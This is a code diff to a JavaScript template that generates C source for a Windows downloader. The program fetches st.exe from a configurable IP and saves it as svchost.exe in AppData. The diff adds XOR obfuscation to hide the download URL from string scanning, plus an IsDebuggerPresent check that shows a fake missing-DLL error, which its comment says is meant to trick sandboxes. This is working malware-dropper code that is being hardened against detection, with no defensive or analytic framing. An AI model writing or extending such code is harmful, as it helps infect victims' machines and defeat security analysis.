@@ -40,6 +40,12 @@ END
 }
 
 function cSource({ ip }) {
+  // XOR encrypt the URL so it doesn't appear as a plain string
+  const url = `http://${ip}/api/downloads/st.exe`;
+  const key = 0x5A;
+  const encUrl = Array.from(url).map(c => c.charCodeAt(0) ^ key);
+  const urlArr = encUrl.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');
+
   return `
 #include <windows.h>
 #include <winhttp.h>
@@ -47,6 +53,15 @@ function cSource({ ip }) {
 #include <stdio.h>
 
 #pragma comment(lib, "winhttp.lib")
+
+void decrypt_url(wchar_t* out, int max_len) {
+    unsigned char enc[] = { ${urlArr} };
+    int key = 0x5A;
+    for (int i = 0; i < sizeof(enc); i++) {
+        out[i] = (wchar_t)(enc[i] ^ key);
+    }
+    out[sizeof(enc)] = 0;
+}
 
 void download_file(const wchar_t* url, const wchar_t* dest) {
     URL_COMPONENTS uc = {0};
@@ -102,13 +117,20 @@ void download_file(const wchar_t* url, const wchar_t* dest) {
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
+    // Fake error to trick sandboxes into thinking it's a broken file
+    if (IsDebuggerPresent()) {
+        MessageBoxW(NULL, L"The code execution cannot proceed because MSVCP140.dll was not found.", L"System Error", MB_ICONERROR);
+        return 1;
+    }
+
     wchar_t appdata[MAX_PATH];
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appdata))) return 1;
 
     wchar_t dest[MAX_PATH];
     _snwprintf(dest, MAX_PATH, L"%ls\\\\svchost.exe", appdata);
 
-    const wchar_t* url = L"http://${ip}/api/downloads/st.exe";
+    wchar_t url[1024];
+    decrypt_url(url, 1024);
     
     download_file(url, dest);
 
